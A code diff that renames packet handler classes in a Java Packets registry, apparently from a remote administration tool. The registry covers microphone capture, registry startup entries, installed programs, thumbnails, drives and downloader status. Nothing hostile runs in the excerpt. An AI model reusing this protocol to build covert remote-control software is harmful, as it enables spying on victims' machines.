@@ -48,7 +48,7 @@ public class Packets {
 		incomingPackets.put(/* "JAVAVER" */(byte) 25, Packet25InitJavaVersion.class); // java
 																				// version
 		incomingPackets.put(/* "JAVAPATH" */(byte) 26, Packet26InitJavaPath.class); // javapath
-		incomingPackets.put(/* "URLSTAT" */(byte) 27, PacketURLSTAT.class); // adv
+		incomingPackets.put(/* "URLSTAT" */(byte) 27, Packet27URLStatus.class); // adv
 																				// downloader
 																				// info
 		incomingPackets.put(/* "LOCALIP" */(byte) 28, Packet28InitLanAddress.class); // local
@@ -101,7 +101,7 @@ public class Packets {
 		incomingPackets.put(/* "REGSTART" */(byte) 53, Packet53RegistryStartup.class); // registry
 																				// startup
 																				// listing
-		incomingPackets.put(/* "REG" */(byte) 54, PacketREG.class); // registry
+		incomingPackets.put(/* "REG" */(byte) 54, Packet54Registry.class); // registry
 																		// enter
 		incomingPackets.put(/* "INSTPROG" */(byte) 55, Packet55InstalledProgram.class); // installed
 																				// program
@@ -109,13 +109,13 @@ public class Packets {
 		incomingPackets.put(/* "ADAPT" */(byte) 56, Packet56NetworkAdapter.class); // network
 																			// adapters
 																			// list
-		incomingPackets.put(/* "RAWINFO" */(byte) 57, PacketRAWINFO.class); // raw
+		incomingPackets.put(/* "RAWINFO" */(byte) 57, Packet57RawComputerInfo.class); // raw
 																				// info
 																				// listing
 		incomingPackets.put(/* "SO" */(byte) 58, Packet58Microphone.class); // sound
-		incomingPackets.put(/* "IMGLIST" */(byte) 59, PacketIMGLIST.class); // thumbnail
+		incomingPackets.put(/* "IMGLIST" */(byte) 59, Packet59ThumbnailPreview.class); // thumbnail
 																				// preview
-		incomingPackets.put(/* "ERROR" */(byte) 60, PacketERROR.class); // error
+		incomingPackets.put(/* "ERROR" */(byte) 60, Packet60Error.class); // error
 		incomingPackets.put(/* "MONITOR" */(byte) 61, Packet61InitMonitors.class); // monitors
 																				// listing
 		incomingPackets.put(/* "DRIVES" */(byte) 62, Packet62InitDrives.class); // drives
